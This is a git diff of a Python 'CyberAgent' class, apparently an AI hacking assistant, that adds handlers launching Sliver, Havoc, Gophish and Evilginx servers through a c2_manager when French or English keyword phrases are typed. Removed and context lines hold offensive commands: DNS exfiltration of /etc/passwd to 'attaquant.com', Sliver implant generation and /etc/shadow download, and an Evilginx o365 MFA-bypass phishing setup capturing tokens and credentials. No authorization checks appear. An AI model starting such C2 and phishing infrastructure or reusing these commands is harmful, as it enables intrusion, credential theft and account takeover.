@@ -8,6 +8,7 @@ import tempfile
 from typing import Optional
 from core.agents.base_agent import BaseAgent
 from core.tools.terminal import terminal
+from core.tools.c2_manager import c2_manager
 from core.tools.kali_tools import search_tools, get_tool, get_by_category, catalog_summary, list_interactive_tools
 from core.tools.exploit_engine import (
     checksec, rop_gadgets, find_gadget, cyclic, cyclic_find,
@@ -398,52 +399,99 @@ class CyberAgent(BaseAgent):
                 "  base64 /etc/passwd | while read l; do dig $l.attaquant.com; done",
                 {"level": 4})
 
-        # ── C2 Frameworks ─────────────────────────────────────────────────────
+        # ── C2 Frameworks — exécution réelle via c2_manager ──────────────────
+        _c2_start_kw = {
+            "sliver":   ["sliver démarrer", "sliver start", "lance sliver", "démarrer sliver", "start sliver"],
+            "havoc":    ["havoc démarrer", "havoc start", "lance havoc", "démarrer havoc", "start havoc"],
+            "gophish":  ["gophish démarrer", "gophish start", "lance gophish", "démarrer gophish", "start gophish"],
+            "evilginx": ["evilginx démarrer", "evilginx start", "lance evilginx", "démarrer evilginx", "start evilginx"],
+        }
+        _c2_stop_kw = {
+            "sliver":   ["sliver stop", "arrêter sliver", "arrête sliver", "stop sliver", "tuer sliver"],
+            "havoc":    ["havoc stop", "arrêter havoc", "arrête havoc", "stop havoc", "tuer havoc"],
+            "gophish":  ["gophish stop", "arrêter gophish", "arrête gophish", "stop gophish", "tuer gophish"],
+            "evilginx": ["evilginx stop", "arrêter evilginx", "arrête evilginx", "stop evilginx", "tuer evilginx"],
+        }
+        _c2_logs_kw = {
+            "sliver":   ["sliver logs", "sliver status", "sliver état"],
+            "havoc":    ["havoc logs", "havoc status", "havoc état"],
+            "gophish":  ["gophish logs", "gophish status", "gophish état"],
+            "evilginx": ["evilginx logs", "evilginx status", "evilginx état"],
+        }
+
+        for c2_name, kws in _c2_start_kw.items():
+            if any(kw in t for kw in kws):
+                res = c2_manager.start(c2_name)
+                if res["success"]:
+                    status = c2_manager.status(c2_name)
+                    msg = (f"✅ {c2_name.upper()} démarré — PID {res['pid']}\n"
+                           f"Port : {status.get('port', 'N/A')}\n"
+                           f"{status['description']}\n\n"
+                           f"Logs en direct disponibles via : '{c2_name} logs'")
+                else:
+                    msg = f"❌ Échec démarrage {c2_name} : {res['error']}"
+                return self._result(res["success"], msg, {"level": 4, "tool": c2_name, "action": "start"})
+
+        for c2_name, kws in _c2_stop_kw.items():
+            if any(kw in t for kw in kws):
+                res = c2_manager.stop(c2_name)
+                msg = f"✅ {c2_name.upper()} arrêté." if res["success"] else f"❌ {res['error']}"
+                return self._result(res["success"], msg, {"level": 4, "tool": c2_name, "action": "stop"})
+
+        for c2_name, kws in _c2_logs_kw.items():
+            if any(kw in t for kw in kws):
+                status = c2_manager.status(c2_name)
+                logs = c2_manager.logs(c2_name, 30)
+                state = "🟢 EN COURS" if status["running"] else "🔴 ARRÊTÉ"
+                uptime = f" — uptime {status['uptime']}" if status.get("uptime") else ""
+                lines = "\n".join(logs["lines"]) if logs["lines"] else "(aucun log)"
+                msg = f"{c2_name.upper()} {state}{uptime}\n\n{lines}"
+                return self._result(True, msg, {"level": 4, "tool": c2_name, "action": "logs"})
+
+        # Status global C2
+        if any(kw in t for kw in ["c2 status", "état c2", "c2 liste", "list c2", "tous les c2"]):
+            all_c2 = c2_manager.list_all()
+            lines = []
+            for s in all_c2:
+                icon = "🟢" if s["running"] else "🔴"
+                uptime = f" (uptime: {s['uptime']})" if s.get("uptime") else ""
+                lines.append(f"{icon} {s['name'].upper()}{uptime} — {s['description']}")
+            return self._result(True, "🧠 C2 Frameworks :\n\n" + "\n".join(lines),
+                                {"level": 4, "action": "status_all"})
+
+        # Déclencheurs génériques (sans action = affiche guide + état)
         if any(kw in t for kw in ["sliver", "c2 sliver"]):
+            s = c2_manager.status("sliver")
+            state = "🟢 EN COURS" if s["running"] else "🔴 ARRÊTÉ"
             return self._result(True,
-                "🧠 C2 — Sliver (open-source, cross-platform)\n\n"
-                "Installation : sudo apt install sliver\n\n"
-                "Démarrage serveur :\n"
-                "  sliver-server\n\n"
-                "Dans Sliver :\n"
-                "  sliver > mtls --lport 443              (démarrer listener)\n"
-                f"  sliver > generate --mtls --lhost {lhost or 'LHOST'} --os linux --arch amd64\n"
-                "  sliver > generate --mtls --lhost IP --os windows -f exe\n"
-                "  sliver > sessions                      (voir les implants)\n"
-                "  sliver > use <session_id>              (interagir)\n\n"
-                "Commandes post-exploitation :\n"
-                "  sliver (victim) > whoami ; ifconfig ; ps\n"
-                "  sliver (victim) > download /etc/shadow\n"
-                "  sliver (victim) > execute --output -- 'cat /etc/passwd'",
+                f"🧠 C2 — Sliver [{state}]\n\n"
+                "Commandes :\n"
+                "  'sliver démarrer'  → lance le serveur\n"
+                "  'sliver stop'      → arrête le serveur\n"
+                "  'sliver logs'      → affiche les logs\n\n"
+                f"Port MTLS : {s['port']} | PID : {s.get('pid', 'N/A')}",
                 {"level": 4, "tool": "sliver"})
 
         if any(kw in t for kw in ["havoc", "c2 havoc"]):
+            s = c2_manager.status("havoc")
+            state = "🟢 EN COURS" if s["running"] else "🔴 ARRÊTÉ"
             return self._result(True,
-                "🧠 C2 — Havoc (open-source, GUI)\n\n"
-                "Démarrage :\n"
-                "  havoc server --profile havoc.yaotl -v\n"
-                "  havoc client  (ouvrir l'interface)\n\n"
-                "Profil minimal havoc.yaotl :\n"
-                "  Teamserver { Host = 0.0.0.0; Port = 40056; }\n"
-                "  Operators { operator { Username = admin; Password = password; } }\n"
-                "  Listeners { Http { Name = http; Hosts = [\"LHOST\"]; Port = 80; } }\n\n"
-                "Générer un implant :\n"
-                "  Listeners → New Listener (HTTP/HTTPS/SMB)\n"
-                "  Payloads → New Payload → Windows Shellcode/EXE",
+                f"🧠 C2 — Havoc [{state}]\n\n"
+                "Commandes :\n"
+                "  'havoc démarrer'  → lance le teamserver\n"
+                "  'havoc stop'      → arrête le serveur\n"
+                "  'havoc logs'      → affiche les logs\n\n"
+                f"Port Teamserver : {s['port']} | PID : {s.get('pid', 'N/A')}",
                 {"level": 4, "tool": "havoc"})
 
         if any(kw in t for kw in ["mythic", "c2 mythic"]):
             return self._result(True,
                 "🧠 C2 — Mythic (framework modulaire, Docker)\n\n"
-                "Installation :\n"
+                "Mythic nécessite Docker. Installation :\n"
                 "  git clone https://github.com/its-a-feature/Mythic\n"
                 "  cd Mythic && sudo ./install_docker_ubuntu.sh\n"
                 "  sudo make && sudo ./mythic-cli start\n\n"
-                "Accès : https://localhost:7443\n"
-                "  Login : mythic_admin / (voir .env)\n\n"
-                "Installer un agent (ex: Apollo) :\n"
-                "  sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo\n"
-                "  sudo ./mythic-cli install github https://github.com/MythicC2Profiles/http",
+                "Accès : https://localhost:7443 (login mythic_admin)",
                 {"level": 4, "tool": "mythic"})
 
         if any(kw in t for kw in ["meterpreter", "metasploit c2", "msf c2"]):
@@ -463,35 +511,29 @@ class CyberAgent(BaseAgent):
 
         # ── Phishing ──────────────────────────────────────────────────────────
         if any(kw in t for kw in ["phishing", "gophish", "campagne phishing"]):
+            s = c2_manager.status("gophish")
+            state = "🟢 EN COURS" if s["running"] else "🔴 ARRÊTÉ"
             return self._result(True,
-                "🧠 NIVEAU 4 — Phishing (Gophish)\n\n"
-                "Démarrage Gophish :\n"
-                "  gophish-start\n"
-                "  UI : http://localhost:3333 (admin/gophish)\n\n"
-                "Workflow :\n"
-                "  1. Sending Profile → configurer SMTP\n"
-                "  2. Email Template → importer template phishing\n"
-                "  3. Landing Page → cloner page login (http://target)\n"
-                "  4. Users & Groups → importer liste emails\n"
-                "  5. Campaign → lancer et tracker\n\n"
-                "Indicateurs suivis : ouvertures, clics, credentials soumis",
+                f"🧠 NIVEAU 4 — Gophish [{state}]\n\n"
+                "Commandes :\n"
+                "  'gophish démarrer'  → lance le serveur (UI port 3333)\n"
+                "  'gophish stop'      → arrête le serveur\n"
+                "  'gophish logs'      → affiche les logs\n\n"
+                f"PID actuel : {s.get('pid', 'N/A')}\n\n"
+                "Une fois démarré → http://localhost:3333 (admin/gophish)",
                 {"level": 4, "tool": "gophish"})
 
         if any(kw in t for kw in ["evilginx", "mfa bypass", "adversary-in-the-middle"]):
+            s = c2_manager.status("evilginx")
+            state = "🟢 EN COURS" if s["running"] else "🔴 ARRÊTÉ"
             return self._result(True,
-                "🧠 NIVEAU 4 — Evilginx (AiTM — MFA Bypass)\n\n"
-                "Démarrage :\n"
-                "  evilginx -p /usr/share/evilginx/phishlets\n\n"
-                "Configuration :\n"
-                "  evilginx > config domain attacker.com\n"
-                "  evilginx > config ip <VPS_IP>\n"
-                "  evilginx > phishlets hostname o365 login.attacker.com\n"
-                "  evilginx > phishlets enable o365\n"
-                "  evilginx > lures create o365\n"
-                "  evilginx > lures get-url 0\n\n"
-                "Phishlets disponibles : o365, gmail, linkedin, github, dropbox, facebook\n\n"
-                "Sessions capturées (tokens + credentials) :\n"
-                "  evilginx > sessions",
+                f"🧠 NIVEAU 4 — Evilginx AiTM [{state}]\n\n"
+                "Commandes :\n"
+                "  'evilginx démarrer'  → lance le proxy (ports 443/80)\n"
+                "  'evilginx stop'      → arrête le proxy\n"
+                "  'evilginx logs'      → affiche les logs\n\n"
+                f"PID actuel : {s.get('pid', 'N/A')}\n\n"
+                "Phishlets disponibles : o365, gmail, linkedin, github, dropbox",
                 {"level": 4, "tool": "evilginx"})
 
         # ── AD / Kerberos ─────────────────────────────────────────────────────
